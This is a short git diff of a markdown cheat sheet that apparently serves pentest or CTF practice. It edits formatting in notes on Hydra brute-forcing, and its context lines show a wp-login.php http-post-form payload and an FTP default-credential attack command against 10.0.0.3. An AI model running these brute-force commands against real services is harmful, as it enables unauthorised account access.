@@ -44,9 +44,9 @@ Payload:
     '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
 ```
 
-`^USER^` & ``^PASS^`` are used as placeholder. 
-``"F=Invalid username"`` is the string for the error message.
----
+`^USER^` & `^PASS^` are used as placeholder. 
+`"F=Invalid username"` is the string for the error message.
+
 ## Bruteforce FTP
 ```
 root@machine:~$ hydra -v -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -f 10.0.0.3 ftp
